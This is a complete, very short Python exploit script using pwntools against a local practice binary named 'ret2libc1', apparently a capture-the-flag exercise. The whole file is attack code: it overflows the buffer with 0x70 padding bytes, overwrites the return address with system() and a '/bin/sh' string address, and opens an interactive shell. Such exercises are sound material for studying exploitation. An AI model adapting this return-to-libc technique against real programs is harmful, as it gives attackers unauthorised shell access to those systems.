from pwn import *

p = process('./ret2libc1')

sys_addr = 0x08048460
binsh_addr = 0x08048720

payload = flat(['a'*0x70,sys_addr,'a'*4,binsh_addr])
p.sendline(payload)
p.interactive()